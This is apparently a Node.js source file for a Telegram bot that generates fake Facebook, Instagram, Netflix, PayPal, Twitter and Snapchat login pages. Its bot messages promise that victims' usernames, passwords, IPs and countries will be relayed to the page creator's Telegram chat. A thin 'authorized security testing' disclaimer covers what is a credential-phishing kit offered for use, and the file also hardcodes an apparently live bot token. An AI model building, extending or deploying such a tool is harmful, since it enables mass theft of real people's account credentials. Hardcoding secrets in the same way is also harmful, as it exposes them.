
const express = require('express');
const fetch = require('node-fetch');

const BOT_TOKEN = '8117725031:AAHIIEhEvHUGBon0oQYjvCQz2lomvnxNFus';
const BASE_URL = process.env.BASE_URL || 'http://localhost:5000';

// Bot commands handler
async function handleBotUpdate(req, res) {
    try {
        const { message } = req.body;
        
        if (!message) {
            return res.json({ ok: true });
        }
        
        const chatId = message.chat.id;
        const text = message.text;
        const userId = message.from.id;
        
        if (text === '/start') {
            const welcomeMessage = `
🔥 *Welcome to Login Page Generator Bot!* 🔥

⚠️ *IMPORTANT: You must join @Kirito_Bots to use this bot!*

🎯 *Create Realistic Login Pages for Security Testing*

✨ *What I Can Do:*
• Generate authentic-looking login pages with user ID tracking
• Capture form submissions instantly  
• Send real-time notifications to Telegram
• Track page statistics and hits

🎨 *Available Templates:*
🔵 Facebook     📸 Instagram    🎬 Netflix
💰 PayPal      🐦 Twitter      👻 Snapchat

🚀 *Quick Start:*
1. Join @Kirito_Bots first
2. Type /create to begin creating your login page!

⚡ *Commands:*
/create - Create a new login page
/help - Get detailed help

📱 *Your URLs will look like:*
https://login-page-gen.onrender.com/instagram/id=${userId}/[pageId]

⚠️ *Disclaimer:* Use At Your own Responsibility....

👨‍💻 *Developer:* @Whosekirito
            `;
            
            await sendBotMessage(chatId, welcomeMessage);
        }
        else if (text === '/create') {
            // Check if user is member of @Kirito_Bots
            const isMember = await checkChannelMembership(userId);
            
            if (!isMember) {
                const joinMessage = `
❌ *Access Denied!*

🚫 You must join @Kirito_Bots to use this bot.

📝 *Steps to access:*
1. Join: https://t.me/Kirito_Bots
2. Come back and type /create again

⚡ *Why join?*
• Get updates and support
• Access to premium features
• Connect with other users

👨‍💻 *Developer:* @Whosekirito
                `;
                await sendBotMessage(chatId, joinMessage);
                return;
            }
            
            const createMessage = `
🔧 *Create Login Page*

Please choose a template by sending one of these commands:

• \`/facebook\` - Create Facebook login page
• \`/instagram\` - Create Instagram login page  
• \`/netflix\` - Create Netflix login page
• \`/paypal\` - Create PayPal login page
• \`/twitter\` - Create Twitter login page
• \`/snapchat\` - Create Snapchat login page

📱 *Your Telegram User ID:* \`${userId}\`
🔗 *URL Format:* \`/[template]/id=${userId}/[pageId]\`
            `;
            
            await sendBotMessage(chatId, createMessage);
        }
        else if (['/facebook', '/instagram', '/netflix', '/paypal', '/twitter', '/snapchat'].includes(text)) {
            // Check if user is member of @Kirito_Bots
            const isMember = await checkChannelMembership(userId);
            
            if (!isMember) {
                const joinMessage = `
❌ *Access Denied!*

🚫 You must join @Kirito_Bots to create pages.

📝 *Join here:* https://t.me/Kirito_Bots
                `;
                await sendBotMessage(chatId, joinMessage);
                return;
            }
            
            const template = text.substring(1); // remove /
            const pageId = await createPageForUser(template, userId.toString());
            
            if (pageId) {
                const pageUrl = `${BASE_URL}/${template}/id=${userId}/${pageId}`;
                const successMessage = `
🎉 *${template.charAt(0).toUpperCase() + template.slice(1)} Login Page Created Successfully!*

🔗 *Your Unique Page URL:*
\`${pageUrl}\`

👤 *Creator ID:* \`${userId}\`
📊 *Template:* ${template.charAt(0).toUpperCase() + template.slice(1)}

✨ *Amazing Features:*
• 🔄 Real-time form capture
• 🌍 IP & Country detection  
• 📈 Hit counter tracking
• ⚡ Instant Telegram notifications to YOU
• 📱 Mobile responsive design
• 🎯 User ID embedded in URL for easy tracking

🚨 *Important:* All login attempts will be sent to this chat instantly!

🔄 *Create More:* Use /create for another page
📞 *Support:* Contact @Whosekirito

👨‍💻 *Developed by:* @Whosekirito
                `;
                
                await sendBotMessage(chatId, successMessage);
            } else {
                await sendBotMessage(chatId, '❌ Failed to create page. Please try again.');
            }
        }
        else if (text === '/help') {
            const helpMessage = `
🤖 *Login Page Generator Bot Help*

*Commands:*
/start - Welcome message
/create - Create a new login page
/help - Show this help

*How to use:*
1. Type /create
2. Choose a template (/facebook, /instagram, etc.)
3. Get your unique login page URL
4. Share the URL for testing
5. Receive login attempts here instantly!

*Supported Templates:*
• Facebook • Instagram • Netflix
• PayPal • Twitter • Snapchat

*Message Format:*
When someone submits a form, you'll receive:
- Hit number and service name
- Username/email and password
- User's country and IP address
- Page statistics

⚠️ *Disclaimer:* For authorized security testing only!

Developer: @Whosekirito
            `;
            
            await sendBotMessage(chatId, helpMessage);
        }
        else {
            await sendBotMessage(chatId, '❓ Unknown command. Type /help to see available commands.');
        }
        
        res.json({ ok: true });
        
    } catch (error) {
        console.error('Bot error:', error);
        res.json({ ok: true });
    }
}

// Function to create page for bot user
async function createPageForUser(template, userId) {
    try {
        const crypto = require('crypto');
        const pageId = crypto.randomBytes(16).toString('hex');
        
        // Store page configuration directly (same as server.js does)
        const { pageConfigs, templates } = require('./server');
        
        pageConfigs.set(pageId, {
            template,
            userId,
            customTitle: templates[template].name,
            createdAt: new Date(),
            hitCount: 0
        });
        
        return pageId;
    } catch (error) {
        console.error('Error creating page for bot:', error);
        return null;
    }
}

// Function to send bot message
async function sendBotMessage(chatId, text) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Bot send error:', error);
        return null;
    }
}

// Function to check if user is member of @Kirito_Bots
async function checkChannelMembership(userId) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getChatMember`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: '@Kirito_Bots',
                user_id: userId
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            const status = result.result.status;
            // Allow if user is creator, administrator, or member
            return ['creator', 'administrator', 'member'].includes(status);
        }
        
        return false; // If API call fails, deny access
    } catch (error) {
        console.error('Error checking membership:', error);
        return false; // If error occurs, deny access for security
    }
}

module.exports = { handleBotUpdate };
